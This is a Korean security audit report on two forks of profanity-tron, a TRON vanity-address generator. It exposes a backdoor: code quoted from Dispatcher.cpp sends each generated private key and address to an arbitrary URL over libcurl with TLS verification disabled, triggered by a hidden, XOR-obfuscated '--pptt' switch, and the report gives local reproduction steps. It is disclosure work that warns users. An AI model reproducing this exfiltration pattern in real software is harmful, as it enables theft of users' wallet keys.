# profanity-tron-main 확정 감사 보고서 (profanity-tron 소스코드 대상)

다음 두 작성자는 동일 인물입니다:
<img width="2611" height="1521" alt="image" src="https://github.com/user-attachments/assets/e0e7bd37-26e7-473e-b256-1563d03c4ce8" />

감사 범위 1: https://github.com/sodasord/profanity-tron

감사 범위 2: https://github.com/sponsord/profanity-tron

Kanxue 분석: https://bbs.kanxue.com/thread-289060.htm
<img width="2753" height="1731" alt="image" src="https://github.com/user-attachments/assets/a414fc55-4162-46d5-b038-6f1b05ebff2d" />
<img width="2608" height="1754" alt="image" src="https://github.com/user-attachments/assets/8cd71beb-f4cb-439a-bda5-e96215678fa6" />

요약 결론: 본 디렉터리의 소스코드에는 **“생성된 개인키 + 주소”를 네트워크를 통해 임의의 URL로 전송할 수 있는 로직 경로가 존재**하며, 이는 **help/README에 공개되지 않은 숨겨진 파라미터**를 통해 활성화됩니다. 또한 해당 네트워크 요청은 **TLS 검증이 명시적으로 비활성화**되어 있어 높은 보안 위험을 내포합니다. 이는 “개인키 업로드/백도어 인터페이스”의 명확한 증거입니다.

---

## 1. 핵심 증거: 생성된 개인키 외부 전송 가능 (URL 파라미터에 평문 포함)

### 1.1 외부 전송 함수: `postResult(privateKey, address, postUrl)`

위치: [`Dispatcher.cpp:L378-L403`]

핵심 코드:

- 개인키와 주소를 쿼리 문자열로 결합:
  - `sendData = "privatekey=" + privateKey + "&address=" + address;` [`Dispatcher.cpp:L381`]
  - `sendUrl = postUrl + "?" + sendData;` [`Dispatcher.cpp:L382`]
- libcurl을 사용하여 네트워크 요청 수행:
  - `curl_easy_setopt(curl, CURLOPT_URL, sendUrl.c_str());` [`Dispatcher.cpp:L387`]

즉, `postUrl`이 비어 있지 않으면 프로그램은 **privatekey와 address를 HTTP 요청 파라미터로 전송**할 수 있습니다.

### 1.2 트리거 시점: 결과가 발견될 때마다 전송 로직 실행

위치: [`Dispatcher.cpp:L405-L452`]

핵심 코드:

- `printResult(...)`에서 생성 및 출력:
  - `strPrivate` (개인키) 및 `strPublicTron` (주소) [`Dispatcher.cpp:L430-L443`]
- `postUrl`이 비어 있지 않으면 `postResult` 호출:
  - `if(!postUrl.empty()) { postResult(strPrivate, strPublicTron, postUrl); }` [`Dispatcher.cpp:L449-L451`]

또한 `printResult(...)`는 결과가 발견될 때 호출됩니다:

- `printResult(..., m_outputFile, m_postUrl);` [`Dispatcher.cpp:L454-L482`], 특히 [`L476`]

결론: **m_postUrl이 설정되면**, vanity 주소가 발견될 때마다 자동으로 개인키와 주소가 외부로 전송됩니다.

---

## 2. 핵심 증거: 업로드 URL 주입을 위한 숨겨진 파라미터 존재 (문서 미공개)

### 2.1 숨겨진 파라미터는 `pptt`로 난독화됨

위치: [`profanity.cpp:L163-L166`]

핵심 코드:

- `_s` 초기값: `{113, 113, 117, 117, 0}` → ASCII `"qquu"`
- 각 문자에 XOR 1 적용: `_s[_k] ^= 1;` [`profanity.cpp:L164`]
- 결과 문자열: `"pptt"` (`'q'^1='p'`, `'u'^1='t'`)
- CLI 파라미터 등록:
  - `argp.addSwitch('p', _s, __x9);` [`profanity.cpp:L165`]

따라서 실제 지원 파라미터:

- 단축 옵션: `-p <value>`
- 장문 옵션: `--pptt <value>`

### 2.2 해당 파라미터는 `postUrl`로 직접 전달됨

위치: [`profanity.cpp:L307`]

핵심 코드:

- `Dispatcher d(..., outputFile, __x9);`

또한 `Dispatcher`에는 `m_postUrl` 필드가 존재:

- `std::string m_postUrl;` [`Dispatcher.hpp:L116-L117`]

이는 외부 입력 채널로 설계된 것임을 의미합니다.

### 2.3 help/README에 미공개 (은폐 증거)

`help.hpp`에는 `--output/--matching/...`만 존재하고 `--pptt` 없음

`README.md`에도 해당 파라미터 없음

결론: 이는 일반 기능이 아니라 **문서에 공개되지 않은 숨겨진 업로드 경로**입니다.

---

## 3. 핵심 증거: TLS 검증 비활성화 (HTTPS도 가로채기 가능)

위치: [`Dispatcher.cpp:L387-L392`]

핵심 코드:

- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);`
- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);`

즉, HTTPS 사용 시에도 인증서 검증이 수행되지 않아 MITM 공격에 취약합니다.

---

## 4. 재현 방법 (로컬 테스트 권장)

목표: 개인키 외부 전송 확인

1) 로컬 HTTP 서버 실행 및 로그 기록  
2) 숨겨진 파라미터로 실행:

- `-p http://127.0.0.1:8080/collect`
- 또는 `--pptt http://127.0.0.1:8080/collect`

결과 발견 시 다음 형태 요청 발생:

- `http://127.0.0.1:8080/collect?privatekey=<hex>&address=<base58>`

---

## 5. 추가 감사 참고

`Dispatcher::Device::createSeed()` 등 함수는 README에 언급되지만 구현 없음:

- [`Dispatcher.hpp:L36-L41`]

이는 코드 재현성과 신뢰성에 영향을 줍니다.

---

## 6. 최종 결론

- 개인키 외부 전송: **확인됨**
- 숨겨진 파라미터 존재: **확인됨**
- TLS 검증 비활성화: **확인됨**

위 세 가지는 **백도어 수준의 위험 구현**이며, 보안 도구로서는 부적절합니다.
